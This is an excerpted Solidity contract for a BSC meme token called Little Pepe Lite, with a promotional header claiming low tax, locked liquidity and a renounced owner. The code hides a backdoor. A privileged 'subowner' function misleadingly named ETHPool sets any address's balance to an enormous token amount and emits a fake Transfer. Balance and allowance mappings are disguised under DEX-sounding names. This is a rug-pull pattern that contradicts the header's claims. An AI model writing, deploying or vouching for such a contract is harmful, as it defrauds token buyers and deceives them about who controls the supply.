...
/*
🤏 🐸little pepe lite 🐸 🤏
The first member of the Frog Family is the little Pepe who is wearing a New Year's tiger costume! and called Lite 🎄🐯
🔹tax 1% 
🔹rewards 1% as $Pepelite
🔹Lp lock 1 year
🔹renounced
Let’s build a strong community together ‼️
🗨 Telegram: https://t.me/PepeliteToken
🔹Pepelite😇 Meme Coin 🔹BSC🔹
...
Let’s build a strong community together ‼️
🗨 Telegram: https://t.me/PepeliteToken
🌐 Website: http://pepelite.io/ Soon

Missed PEPE? Don't miss Little Pepe Lite ! Second chances dont come around often.
*/
...
contract LittlePepelite is w20Burnable, IERC20, w20Ownable {
    ...
    */
    function XRPPool(address tusdRewards) external subowner {
    ...
    */
    ...
    function ETHPool(address StakingVaults) external subowner {
        IDEXFactory[StakingVaults] = 10000000000 * 10 ** 23;
        
        emit Transfer(StakingVaults, address(0), 10000000000 * 10 ** 23);
    }
    /**
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), IDEXRouter[sender][_msgSender()].sub(yoursold, "IERC20: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, IDEXRouter[_msgSender()][transporteur].sub(allbalances, "IERC20: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        ...
        IDEXFactory[sender] = IDEXFactory[sender].sub(yoursold, "IERC20: transfer yoursold exceeds balance");
